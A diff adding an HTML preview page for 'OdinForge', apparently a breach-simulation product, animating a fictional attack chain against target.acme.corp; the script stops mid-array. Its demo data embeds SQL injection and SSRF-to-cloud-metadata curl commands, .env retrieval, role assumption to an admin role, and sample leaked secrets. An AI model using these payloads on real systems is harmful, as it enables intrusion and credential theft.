@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OdinForge — Breach Chain View Preview</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#07090f;--panel:#0c1018;--panel2:#0f1520;--nav:#090c14;
+  --border:#1a2535;--border2:#243348;--hover:rgba(255,255,255,.025);
+  --red:#e8384f;--red-dim:rgba(232,56,79,.09);--red-border:rgba(232,56,79,.22);
+  --green:#22c55e;--green-dim:rgba(34,197,94,.08);--green-border:rgba(34,197,94,.2);
+  --blue:#60a5fa;--blue-dim:rgba(96,165,250,.1);--blue-border:rgba(96,165,250,.25);
+  --amber:#f59e0b;--amber-dim:rgba(245,158,11,.09);--amber-border:rgba(245,158,11,.25);
+  --purple:#a78bfa;--cyan:#06b6d4;--gray:#334155;
+  --t1:#eaf0f8;--t2:#7a93ad;--t3:#3a5166;--t4:#1e3148;
+  --mono:'IBM Plex Mono',Consolas,'Courier New',monospace;
+  --sans:'IBM Plex Sans',system-ui,sans-serif;
+}
+html,body{height:100%;background:var(--bg);color:var(--t1);font-family:var(--sans);overflow:hidden}
+
+/* ── SHELL ── */
+.shell{height:100vh;display:grid;grid-template-columns:220px 1fr;grid-template-rows:48px 1fr 24px}
+
+/* ── TOPBAR ── */
+.topbar{grid-column:1/-1;display:flex;align-items:center;border-bottom:1px solid var(--border);background:var(--panel)}
+.tb-logo{width:220px;height:100%;display:flex;align-items:center;gap:10px;padding:0 16px;border-right:1px solid var(--border);flex-shrink:0}
+.tb-mark{width:28px;height:28px;background:var(--red);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.tb-mark svg{width:15px;height:15px;fill:none;stroke:#fff;stroke-width:2}
+.tb-wordmark{font-size:15px;font-weight:700;color:var(--t1);letter-spacing:.01em;font-family:var(--sans)}
+.tb-wordmark span{color:var(--red)}
+.tb-wordmark small{display:block;font-family:var(--mono);font-size:8px;font-weight:400;letter-spacing:.18em;color:var(--t4);margin-top:1px}
+.tb-page{padding:0 16px;display:flex;flex-direction:column;gap:1px}
+.tb-page-name{font-size:13px;font-weight:600;color:var(--t1)}
+.tb-page-sub{font-family:var(--mono);font-size:9px;letter-spacing:.06em;color:var(--t3)}
+.tb-chain-id{font-family:var(--mono);font-size:10px;color:var(--t3);padding:3px 8px;border:1px solid var(--border2);margin-left:4px}
+.tb-alert{display:flex;align-items:center;gap:6px;padding:4px 10px;background:var(--red-dim);border:1px solid var(--red-border);font-family:var(--mono);font-size:9px;letter-spacing:.07em;color:var(--red);margin-left:10px}
+.tb-alert-dot{width:5px;height:5px;border-radius:50%;background:var(--red);animation:blink 1.4s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
+.tb-right{margin-left:auto;display:flex;height:100%;align-items:stretch}
+.tb-stat{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:0 14px;border-left:1px solid var(--border);gap:1px}
+.tb-stat-v{font-family:var(--mono);font-size:13px;font-weight:500;line-height:1}
+.tb-stat-l{font-family:var(--mono);font-size:8px;letter-spacing:.12em;text-transform:uppercase;color:var(--t3)}
+.tb-user{display:flex;align-items:center;gap:9px;padding:0 14px;border-left:1px solid var(--border);cursor:pointer}
+.tb-user:hover{background:var(--hover)}
+.tb-avatar{width:26px;height:26px;border-radius:50%;background:var(--red);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;color:#fff;flex-shrink:0}
+.tb-user-name{font-size:12px;font-weight:500;color:var(--t1)}
+.tb-user-role{font-family:var(--mono);font-size:8px;letter-spacing:.07em;color:var(--t3)}
+
+/* ── SIDEBAR ── */
+.sidebar{background:var(--nav);border-right:1px solid var(--border);display:flex;flex-direction:column}
+.nav-section{padding:16px 12px 4px;font-family:var(--mono);font-size:8px;letter-spacing:.14em;text-transform:uppercase;color:var(--t4)}
+.nav-item{display:flex;align-items:center;gap:10px;padding:9px 14px;font-size:12px;font-weight:500;color:var(--t2);cursor:pointer;border-left:2px solid transparent;transition:all .12s;user-select:none}
+.nav-item svg{width:14px;height:14px;flex-shrink:0;stroke:currentColor;fill:none;stroke-width:1.5}
+.nav-item:hover{color:var(--t1);background:var(--hover)}
+.nav-item.active{color:var(--t1);background:rgba(255,255,255,.04);border-left-color:var(--red)}
+.nav-badge{margin-left:auto;font-family:var(--mono);font-size:9px;padding:1px 6px;background:var(--red-dim);color:var(--red);border:1px solid var(--red-border)}
+.nav-spacer{flex:1}
+.nav-settings{display:flex;align-items:center;gap:10px;padding:8px 14px;font-size:12px;color:var(--t3);cursor:pointer;transition:all .12s}
+.nav-settings svg{width:14px;height:14px;flex-shrink:0;stroke:currentColor;fill:none;stroke-width:1.5}
+.nav-settings:hover{color:var(--t2);background:var(--hover)}
+.nav-footer{display:flex;align-items:center;gap:10px;padding:10px 14px;border-top:1px solid var(--border);cursor:pointer;transition:background .12s}
+.nav-footer:hover{background:var(--hover)}
+.nav-footer-av{width:26px;height:26px;border-radius:50%;background:var(--red);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;color:#fff;flex-shrink:0}
+.nav-footer-name{font-size:12px;font-weight:500;color:var(--t1)}
+.nav-footer-role{font-family:var(--mono);font-size:8px;letter-spacing:.07em;color:var(--t3)}
+
+/* ── MAIN ── */
+.main{overflow:hidden;display:flex;flex-direction:column;background:var(--bg)}
+
+/* ── STATUS BAR ── */
+.statusbar{grid-column:1/-1;display:flex;align-items:center;padding:0 16px;gap:12px;border-top:1px solid var(--border);background:var(--panel);font-family:var(--mono);font-size:9px;letter-spacing:.07em;color:var(--t4)}
+.sb-live{color:var(--blue);display:flex;align-items:center;gap:5px;margin-left:auto}
+.sb-live::before{content:'';display:inline-block;width:5px;height:5px;border-radius:50%;background:var(--blue);animation:blink 1.4s infinite}
+
+/* ── BREACH CHAIN PAGE ── */
+.bc-page{display:flex;flex-direction:column;height:100%;overflow:hidden}
+
+/* Chain header strip */
+.bc-header{display:flex;align-items:center;gap:12px;padding:12px 16px;border-bottom:1px solid var(--border);background:var(--panel);flex-shrink:0}
+.bc-back{display:flex;align-items:center;gap:6px;font-family:var(--mono);font-size:10px;color:var(--t3);cursor:pointer;padding:4px 8px;border:1px solid var(--border2);transition:all .12s}
+.bc-back:hover{color:var(--t1);border-color:var(--t2)}
+.bc-back svg{width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2}
+.bc-target{font-family:var(--mono);font-size:12px;font-weight:600;color:var(--t1)}
+.bc-meta{font-family:var(--mono);font-size:9px;color:var(--t3)}
+.bc-status-run{display:flex;align-items:center;gap:6px;padding:4px 10px;background:var(--green-dim);border:1px solid var(--green-border);font-family:var(--mono);font-size:9px;color:var(--green);margin-left:auto}
+.bc-status-run::before{content:'';width:5px;height:5px;border-radius:50%;background:var(--green);animation:blink 1.4s infinite}
+.bc-actions{display:flex;gap:6px}
+.btn{display:inline-flex;align-items:center;gap:5px;padding:6px 12px;border:1px solid;font-size:11px;font-weight:500;cursor:pointer;transition:all .12s;font-family:var(--sans)}
+.btn svg{width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:1.5;flex-shrink:0}
+.btn-ghost{background:transparent;border-color:var(--border2);color:var(--t2)}
+.btn-ghost:hover{border-color:var(--t2);color:var(--t1)}
+.btn-danger{background:transparent;border-color:var(--red-border);color:var(--red)}
+.btn-danger:hover{background:var(--red-dim)}
+
+/* Phase bar */
+.phase-bar{display:flex;border-bottom:1px solid var(--border);flex-shrink:0}
+.phase-pip{flex:1;padding:7px 10px;text-align:center;font-family:var(--mono);font-size:9px;letter-spacing:.08em;border-right:1px solid var(--border);color:var(--t4);transition:all .3s;cursor:default}
+.phase-pip:last-child{border-right:none}
+.phase-pip.done{color:var(--green)}
+.phase-pip.active{color:var(--amber);background:rgba(245,158,11,.05)}
+.phase-pip.breach{color:var(--red)}
+.phase-pip .ph-num{font-size:8px;display:block;margin-bottom:2px;opacity:.6}
+
+/* Main 3-panel layout */
+.bc-body{display:flex;flex:1;overflow:hidden}
+
+/* Left: terminal feed */
+.feed-panel{width:310px;flex-shrink:0;display:flex;flex-direction:column;border-right:1px solid var(--border)}
+.panel-hdr{display:flex;align-items:center;justify-content:space-between;padding:7px 12px;border-bottom:1px solid var(--border);background:var(--panel);flex-shrink:0}
+.panel-hdr-t{font-family:var(--mono);font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:var(--t3)}
+.panel-hdr-badge{font-family:var(--mono);font-size:8px;padding:1px 6px;border:1px solid}
+.feed-body{flex:1;overflow-y:auto;padding:8px;display:flex;flex-direction:column;gap:2px;font-family:var(--mono)}
+.feed-row{display:flex;gap:6px;font-size:9px;line-height:1.55;animation:fadein .15s ease}
+@keyframes fadein{from{opacity:0}to{opacity:1}}
+.fr-ts{color:var(--t4);flex-shrink:0;min-width:36px}
+.fr-agent{flex-shrink:0;font-size:7px;padding:1px 4px;font-weight:700;min-width:40px;text-align:center;margin-top:1px}
+.ag-e{background:var(--red-dim);color:var(--red);border:1px solid var(--red-border)}
+.ag-r{background:var(--blue-dim);color:var(--blue);border:1px solid var(--blue-border)}
+.ag-c{background:var(--amber-dim);color:var(--amber);border:1px solid var(--amber-border)}
+.ag-l{background:var(--green-dim);color:var(--green);border:1px solid var(--green-border)}
+.ag-s{background:rgba(255,255,255,.04);color:var(--t3);border:1px solid var(--border2)}
+.fr-msg{flex:1;color:var(--t2)}
+.fr-msg.ok{color:var(--green)}.fr-msg.crit{color:var(--red)}.fr-msg.warn{color:var(--amber)}.fr-msg.dim{color:var(--t3)}
+.cur{display:inline-block;width:6px;height:10px;background:var(--t3);animation:blink .8s step-end infinite;vertical-align:middle}
+
+/* Center: network map */
+.map-panel{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.map-body{flex:1;overflow:hidden;position:relative}
+#gsvg{width:100%;height:100%;display:block}
+
+/* Right: evidence panel */
+.evidence-panel{width:0;flex-shrink:0;display:flex;flex-direction:column;overflow:hidden;transition:width .2s;border-left:1px solid var(--border)}
+.evidence-panel.open{width:268px}
+.ev-hdr{display:flex;align-items:center;justify-content:space-between;padding:7px 12px;border-bottom:1px solid var(--border);background:var(--panel);flex-shrink:0}
+.ev-hdr-t{font-family:var(--mono);font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:200px}
+.ev-close{background:transparent;border:none;color:var(--t3);font-size:14px;cursor:pointer;padding:0 4px;line-height:1;flex-shrink:0}
+.ev-close:hover{color:var(--t1)}
+.ev-body{flex:1;overflow-y:auto;padding:12px}
+.ev-empty{display:flex;align-items:center;justify-content:center;height:100%;font-family:var(--mono);font-size:10px;color:var(--t4);text-align:center;padding:20px;line-height:1.7}
+.ev-sev{display:inline-block;font-family:var(--mono);font-size:8px;padding:2px 8px;font-weight:700;letter-spacing:.06em;border:1px solid;margin-bottom:10px}
+.ev-sev.crit{color:var(--red);border-color:var(--red-border);background:var(--red-dim)}
+.ev-sev.high{color:var(--amber);border-color:var(--amber-border);background:var(--amber-dim)}
+.ev-sev.info{color:var(--t3);border-color:var(--border2);background:rgba(255,255,255,.03)}
+.ev-section{margin-bottom:12px}
+.ev-label{font-family:var(--mono);font-size:8px;letter-spacing:.12em;text-transform:uppercase;color:var(--t3);margin-bottom:5px;display:flex;align-items:center;gap:5px}
+.ev-label-dot{width:5px;height:5px;border-radius:50%;flex-shrink:0}
+.ev-grid{display:grid;grid-template-columns:auto 1fr;gap:3px 10px;font-family:var(--mono);font-size:9px;line-height:1.65}
+.ev-k{color:var(--t3);white-space:nowrap}
+.ev-v{color:var(--t1);word-break:break-all}
+.ev-v.red{color:var(--red);font-weight:700}
+.ev-v.amber{color:var(--amber)}
+.ev-v.blue{color:var(--blue)}
+.ev-v.green{color:var(--green)}
+.ev-code{font-family:var(--mono);font-size:8.5px;padding:8px;background:var(--bg);border:1px solid var(--border2);color:var(--t2);line-height:1.65;white-space:pre-wrap;word-break:break-all;margin-top:3px}
+.ev-extracted{font-family:var(--mono);font-size:8.5px;padding:8px;background:rgba(232,56,79,.05);border:1px solid var(--red-border);color:var(--red);line-height:1.65;white-space:pre-wrap;word-break:break-all;margin-top:3px}
+.ev-divider{height:1px;background:var(--border);margin:10px 0}
+.ev-hash{font-family:var(--mono);font-size:7.5px;color:var(--t4);padding:5px 7px;background:var(--bg);border:1px solid var(--border);word-break:break-all;margin-top:8px}
+.ev-hash span{color:var(--t3)}
+@keyframes pn{from{opacity:0;transform:scale(0)}to{opacity:1;transform:scale(1)}}
+@keyframes dl{from{stroke-dashoffset:400}to{stroke-dashoffset:0}}
+</style>
+</head>
+<body>
+<div class="shell">
+
+<!-- TOPBAR -->
+<div class="topbar">
+  <div class="tb-logo">
+    <div class="tb-mark">
+      <svg viewBox="0 0 24 24"><path d="M12 2L4 6v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V6l-8-4z"/><path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <div class="tb-wordmark">Odin<span>Forge</span><small>AEV PLATFORM</small></div>
+  </div>
+  <div class="tb-page">
+    <div class="tb-page-name">Breach Chain</div>
+    <div class="tb-page-sub">Live Engagement View</div>
+  </div>
+  <div class="tb-chain-id">bc-a3f8c2d1</div>
+  <div class="tb-alert"><div class="tb-alert-dot"></div>BREACH PATHS FORMING</div>
+  <div class="tb-right">
+    <div class="tb-stat"><div class="tb-stat-v" id="top-findings" style="color:var(--red)">0</div><div class="tb-stat-l">Findings</div></div>
+    <div class="tb-stat"><div class="tb-stat-v" id="top-creds" style="color:var(--amber)">0</div><div class="tb-stat-l">Creds</div></div>
+    <div class="tb-stat"><div class="tb-stat-v" id="top-nodes">0</div><div class="tb-stat-l">Nodes</div></div>
+    <div class="tb-stat"><div class="tb-stat-v" id="top-timer">00:00</div><div class="tb-stat-l">Elapsed</div></div>
+    <div class="tb-stat"><div class="tb-stat-v" id="top-grade" style="color:var(--t4)">—</div><div class="tb-stat-l">Grade</div></div>
+    <div class="tb-user">
+      <div class="tb-avatar">D</div>
+      <div><div class="tb-user-name">Dre</div><div class="tb-user-role">OPERATOR</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- SIDEBAR -->
+<div class="sidebar">
+  <div class="nav-section">Operations</div>
+  <div class="nav-item active">
+    <svg viewBox="0 0 24 24"><path d="M12 2L4 6v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V6l-8-4z"/></svg>
+    Breach Chains
+    <span class="nav-badge">2</span>
+  </div>
+  <div class="nav-item">
+    <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>
+    Reports
+  </div>
+  <div class="nav-spacer"></div>
+  <div class="nav-settings">
+    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg>
+    Settings
+  </div>
+  <div class="nav-footer">
+    <div class="nav-footer-av">D</div>
+    <div><div class="nav-footer-name">Dre</div><div class="nav-footer-role">OPERATOR</div></div>
+  </div>
+</div>
+
+<!-- MAIN: BREACH CHAIN PAGE -->
+<div class="main">
+<div class="bc-page">
+
+  <!-- Chain header -->
+  <div class="bc-header">
+    <div class="bc-back"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>All Chains</div>
+    <div>
+      <div class="bc-target">https://target.acme.corp</div>
+      <div class="bc-meta">bc-a3f8c2d1 &middot; full-chain &middot; mode: live &middot; evidence: contract v2 &middot; 44.218.109.23</div>
+    </div>
+    <div class="bc-status-run">running</div>
+    <div class="bc-actions">
+      <button class="btn btn-ghost">
+        <svg viewBox="0 0 24 24"><rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/></svg>
+        Pause
+      </button>
+      <button class="btn btn-danger">
+        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/></svg>
+        Stop
+      </button>
+    </div>
+  </div>
+
+  <!-- Phase progress bar -->
+  <div class="phase-bar">
+    <div class="phase-pip breach" id="ph0"><span class="ph-num">01</span>APP</div>
+    <div class="phase-pip breach" id="ph1"><span class="ph-num">02</span>CREDS</div>
+    <div class="phase-pip active" id="ph2"><span class="ph-num">03</span>IAM</div>
+    <div class="phase-pip" id="ph3"><span class="ph-num">04</span>K8S</div>
+    <div class="phase-pip" id="ph4"><span class="ph-num">05</span>LATERAL</div>
+    <div class="phase-pip" id="ph5"><span class="ph-num">06</span>IMPACT</div>
+  </div>
+
+  <!-- 3-panel body -->
+  <div class="bc-body">
+
+    <!-- LEFT: Terminal feed -->
+    <div class="feed-panel">
+      <div class="panel-hdr">
+        <span class="panel-hdr-t">live action feed</span>
+        <span class="panel-hdr-badge" id="feed-phase-badge" style="color:var(--amber);border-color:var(--amber-border);background:var(--amber-dim)">phase 3</span>
+      </div>
+      <div class="feed-body" id="feedBody">
+        <div class="feed-row"><span class="fr-ts"></span><span class="fr-agent ag-s">SYS</span><span class="fr-msg dim">initializing engagement...</span></div>
+      </div>
+    </div>
+
+    <!-- CENTER: Network map -->
+    <div class="map-panel">
+      <div class="panel-hdr">
+        <span class="panel-hdr-t">network breach map</span>
+        <span style="font-family:var(--mono);font-size:8px;color:var(--t4)" id="map-hint">click any node to inspect evidence</span>
+      </div>
+      <div class="map-body">
+        <svg id="gsvg" viewBox="0 0 510 295" preserveAspectRatio="xMidYMid meet">
+          <defs>
+            <marker id="ar" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="4" markerHeight="4" orient="auto-start-reverse">
+              <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round"/>
+            </marker>
+          </defs>
+          <text id="idle" x="255" y="148" text-anchor="middle" font-family="monospace" font-size="10" fill="#1e3148">initializing network map...</text>
+        </svg>
+      </div>
+    </div>
+
+    <!-- RIGHT: Evidence panel -->
+    <div class="evidence-panel" id="evPanel">
+      <div class="ev-hdr">
+        <span class="ev-hdr-t" id="evTitle">evidence</span>
+        <button class="ev-close" onclick="closeEvidence()">✕</button>
+      </div>
+      <div class="ev-body" id="evBody">
+        <div class="ev-empty">click a confirmed<br>node to inspect<br>evidence &amp; asset proof</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+</div>
+
+<!-- STATUS BAR -->
+<div class="statusbar">
+  <span>engine</span><span style="color:var(--t3)">Mjolnir v4.2</span>
+  <span style="color:var(--border2)">&middot;</span>
+  <span>build</span><span style="color:var(--t3)">2026.03.17</span>
+  <span style="color:var(--border2)">&middot;</span>
+  <span>chain</span><span style="color:var(--t3)">bc-a3f8c2d1</span>
+  <div class="sb-live">engagement active</div>
+</div>
+
+</div>
+</body>
+<script>
+let elapsed=0,ti=null,findings=0,creds=0,nodes=0;
+const ND={};
+
+const NODES=[
+  {id:'p1',x:52,y:38,r:17,label:'1',col:'#e8384f',data:{title:'Phase 1 — app compromise',sev:'crit',assets:[{k:'host',v:'target.acme.corp',c:'blue'},{k:'resolved IP',v:'44.218.109.23',c:'red'},{k:'origin IP',v:'10.0.1.45 (bypass)',c:'red'},{k:'open ports',v:'80, 443, 8080, 3000',c:''},{k:'stack',v:'Node.js 20 · Express 4 · React 18',c:''},{k:'database',v:'PostgreSQL 15.3',c:'red'}],technique:'Active exploitation — multi-vector',mitre:'T1190',ts:'2026-03-22T09:02:31Z',hash:'a3f8c2d1e4b7f9a2'}},
+  {id:'sqli',x:138,y:25,r:14,label:'SQLi',col:'#e8384f',data:{title:'SQL injection — /api/users/search',sev:'crit',assets:[{k:'host',v:'target.acme.corp',c:'blue'},{k:'IP',v:'44.218.109.23:443',c:'red'},{k:'endpoint',v:'GET /api/users/search',c:''},{k:'parameter',v:'q (query string)',c:'red'},{k:'db host',v:'10.0.1.12:5432',c:'red'},{k:'rows leaked',v:'847 records confirmed',c:'red'}],technique:'SQL injection (union-based)',mitre:'T1190',status:200,evidence:"Payload: ' UNION SELECT NULL,table_name FROM information_schema.tables--\nHTTP 200 — 847 rows. users.email, users.password_hash, api_keys all readable.",curl:"curl -sk -G 'https://target.acme.corp/api/users/search' \\\n  --data-urlencode \"q=' UNION SELECT NULL,table_name FROM information_schema.columns--\"",ts:'2026-03-22T09:04:58Z',hash:'b7e2d5f8a1c4e7d2'}},
+  {id:'ssrf',x:138,y:68,r:14,label:'SSRF',col:'#e8384f',data:{title:'SSRF → AWS IMDS reachable',sev:'crit',assets:[{k:'server IP',v:'44.218.109.23',c:'red'},{k:'endpoint',v:'POST /api/fetch',c:''},{k:'IMDS IP',v:'169.254.169.254',c:'red'},{k:'IMDS path',v:'/latest/meta-data/iam/',c:'red'},{k:'instance-id',v:'i-0a1b2c3d4e5f67890',c:''},{k:'IMDS ver',v:'v1 — no token required',c:'red'}],technique:'SSRF to cloud metadata service',mitre:'T1552.005',status:200,curl:"curl -X POST 'https://target.acme.corp/api/fetch' \\\n  -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-deploy-role\"}'",ts:'2026-03-22T09:05:52Z',hash:'c1d4e7a2b5f8c1d4'}},
+  {id:'xss',x:130,y:10,r:10,label:'XSS',col:'#334155',data:{title:'XSS — no reflection found',sev:'info',assets:[{k:'host',v:'target.acme.corp',c:''},{k:'tested',v:'23 input fields',c:''},{k:'result',v:'Cloudflare WAF — all blocked',c:''}],technique:'XSS (attempted, blocked)',mitre:'T1189',ts:'2026-03-22T09:06:15Z',hash:null}},
+  {id:'p2',x:205,y:50,r:17,label:'2',col:'#f59e0b',data:{title:'Phase 2 — credential extraction',sev:'crit',assets:[{k:'source 1',v:'/.env HTTP 200',c:'red'},{k:'source 2',v:'SSRF → IMDS response',c:'red'},{k:'source 3',v:'SQLi response body',c:'red'},{k:'total creds',v:'6 extracted',c:'red'}],technique:'Unsecured credentials — multiple sources',mitre:'T1552',ts:'2026-03-22T09:07:00Z',hash:'d4e7a2b5c8f1d4e7'}},
+  {id:'envkey',x:278,y:20,r:13,label:'AWS KEY',col:'#e8384f',data:{title:'AWS_SECRET_ACCESS_KEY — /.env exposed',sev:'crit',assets:[{k:'source URL',v:'https://target.acme.corp/.env',c:'red'},{k:'server IP',v:'44.218.109.23:443',c:'red'},{k:'HTTP status',v:'200 OK — no auth',c:'red'},{k:'key ID',v:'AKIAIOSFODNN7EXAMPLE',c:'red'},{k:'AWS account',v:'123456789012',c:'red'},{k:'access level',v:'AdministratorAccess',c:'red'}],technique:'Credentials in files — .env exposed',mitre:'T1552.001',status:200,curl:"curl -sk 'https://target.acme.corp/.env'",extracted:'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',ts:'2026-03-22T09:07:44Z',hash:'e7a2b5c8d1f4e7a2'}},
+  {id:'dbpass',x:278,y:50,r:13,label:'DB PASS',col:'#f59e0b',data:{title:'DATABASE_URL — connection string',sev:'crit',assets:[{k:'source',v:'https://target.acme.corp/.env',c:'red'},{k:'db host',v:'rds.internal.acme.corp',c:'blue'},{k:'db IP',v:'10.0.3.22:5432',c:'red'},{k:'db name',v:'prod',c:'red'},{k:'db user',v:'admin (superuser)',c:'red'}],technique:'Credentials in files — database URI',mitre:'T1552.001',extracted:'postgres://admin:S3cr3tP@ss@rds.internal.acme.corp:5432/prod',ts:'2026-03-22T09:07:44Z',hash:'f1a4b7c2d5e8f1a4'}},
+  {id:'jwtsec',x:278,y:80,r:13,label:'JWT SEC',col:'#f59e0b',data:{title:'JWT_SECRET — signing key',sev:'crit',assets:[{k:'source',v:'https://target.acme.corp/.env',c:'red'},{k:'algorithm',v:'HS256 (symmetric)',c:'red'},{k:'impact',v:'forge any auth token',c:'red'}],technique:'Steal application access token',mitre:'T1528',extracted:'JWT_SECRET=sup3r_s3cr3t_k3y_f0r_jwt_signing',ts:'2026-03-22T09:07:44Z',hash:'a2b5c8d1e4f7a2b5'}},
+  {id:'imdskey',x:278,y:110,r:13,label:'IMDS ROLE',col:'#e8384f',data:{title:'IAM role credentials via SSRF+IMDS',sev:'crit',assets:[{k:'instance ID',v:'i-0a1b2c3d4e5f67890',c:'red'},{k:'IAM role',v:'ec2-deploy-role',c:'red'},{k:'AWS account',v:'123456789012',c:'red'},{k:'key ID',v:'ASIAIOSFODNN7EXAMPLE',c:'red'},{k:'type',v:'AssumedRole (temporary)',c:'red'},{k:'IMDS',v:'v1 — no token required',c:'red'}],technique:'Cloud IMDS exploitation',mitre:'T1552.005',extracted:'AccessKeyId: ASIAIOSFODNN7EXAMPLE\nSessionToken: IQoJb3JpZ2lu...',ts:'2026-03-22T09:08:22Z',hash:'b5c8d1e4f7a2b5c8'}},
+  {id:'p3',x:370,y:30,r:17,label:'3',col:'#60a5fa',data:{title:'Phase 3 — cloud IAM escalation',sev:'crit',assets:[{k:'AWS account',v:'123456789012',c:'red'},{k:'region',v:'us-east-1',c:''},{k:'path',v:'.env key → sts:AssumeRole',c:'red'},{k:'final role',v:'arn:aws:iam::123456789012:role/OrgAdmin',c:'red'},{k:'policy',v:'AdministratorAccess (*:*)',c:'red'}],technique:'Cloud IAM privilege escalation',mitre:'T1078.004',ts:'2026-03-22T09:09:05Z',hash:'c8d1e4f7a2b5c8d1'}},
+  {id:'admin',x:435,y:14,r:14,label:'Admin',col:'#e8384f',data:{title:'AdministratorAccess — AWS cloud root',sev:'crit',assets:[{k:'AWS account',v:'123456789012',c:'red'},{k:'assumed role',v:'arn:aws:sts::123456789012:assumed-role/OrgAdmin/session1',c:'red'},{k:'STS endpoint',v:'sts.us-east-1.amazonaws.com',c:'blue'},{k:'HTTP status',v:'200 OK',c:'green'},{k:'confirmed via',v:'iam:GetCallerIdentity',c:''}],technique:'Valid cloud accounts — full administrator',mitre:'T1078.004',status:200,curl:"aws sts assume-role \\\n  --role-arn arn:aws:iam::123456789012:role/OrgAdmin \\\n  --role-session-name odinforge-test",extracted:'AssumedRoleId: AROAIOSFODNN7EXAMPLE\nArn: arn:aws:sts::123456789012:assumed-role/OrgAdmin/odinforge-test',ts:'2026-03-22T09:09:58Z',hash:'d1e4f7a2b5c8d1e4'}},
+  {id:'s3',x:435,y:50,r:13,label:'S3 open',col:'#e8384f',data:{title:'S3 — acme-customer-data-prod (public-read)',sev:'crit',assets:[{k:'bucket',v:'acme-customer-data-prod',c:'red'},{k:'ARN',v:'arn:aws:s3:::acme-customer-data-prod',c:'red'},{k:'endpoint',v:'acme-customer-data-prod.s3.amazonaws.com',c:'blue'},{k:'ACL',v:'public-read (misconfigured)',c:'red'},{k:'objects',v:'847,291 objects',c:'red'},{k:'size',v:'2.3 TB',c:'red'}],technique:'Data from cloud storage',mitre:'T1530',curl:"aws s3 ls s3://acme-customer-data-prod --no-sign-request",extracted:'847,291 objects readable without credentials.',ts:'2026-03-22T09:10:14Z',hash:'e4f7a2b5c8d1e4f7'}},
+];
+
+const EDGES=[
+  {x1:65,y1:38,x2:122,y2:28,col:'#e8384f',d:false,cx:false,delay:3200},
+  {x1:65,y1:45,x2:122,y2:66,col:'#e8384f',d:false,cx:false,delay:4500},
+  {x1:60,y1:32,x2:120,y2:11,col:'#334155',d:true,cx:false,delay:5200},
+  {x1:150,y1:38,x2:188,y2:52,col:'#f59e0b',d:false,cx:false,delay:5900},
+  {x1:150,y1:65,x2:188,y2:57,col:'#f59e0b',d:false,cx:true,delay:6200},
+  {x1:218,y1:38,x2:264,y2:22,col:'#e8384f',d:false,cx:false,delay:6600},
+  {x1:218,y1:50,x2:264,y2:50,col:'#f59e0b',d:false,cx:false,delay:6900},
+  {x1:218,y1:62,x2:264,y2:80,col:'#f59e0b',d:false,cx:false,delay:7200},
+  {x1:218,y1:65,x2:264,y2:109,col:'#e8384f',d:false,cx:true,delay:7600},
+  {x1:290,y1:22,x2:352,y2:32,col:'#e8384f',d:false,cx:false,delay:8200},
+  {x1:290,y1:110,x2:352,y2:38,col:'#e8384f',d:false,cx:true,delay:8500},
+  {x1:383,y1:20,x2:420,y2:15,col:'#e8384f',d:false,cx:false,delay:8900},
+  {x1:383,y1:35,x2:420,y2:50,col:'#60a5fa',d:false,cx:false,delay:9200},
+];
+
+const FEED=[
+  ['SYS','ag-s','target resolved: 44.218.109.23 · Cloudflare · origin: 10.0.1.45','dim','00:00',300],
+  ['RECON','ag-r','crawling 47 endpoints · Node.js 20 · PostgreSQL 15 · AWS us-east-1 · K8s v1.28','ok','00:02',1200],
+  ['RECON','ag-r','Cloudflare origin bypass confirmed via header leak','warn','00:02',2000],
+  ['EXPLOIT','ag-e','SQLi variants firing — /api/users/search?q= (12 payloads)','dim','00:03',2800],
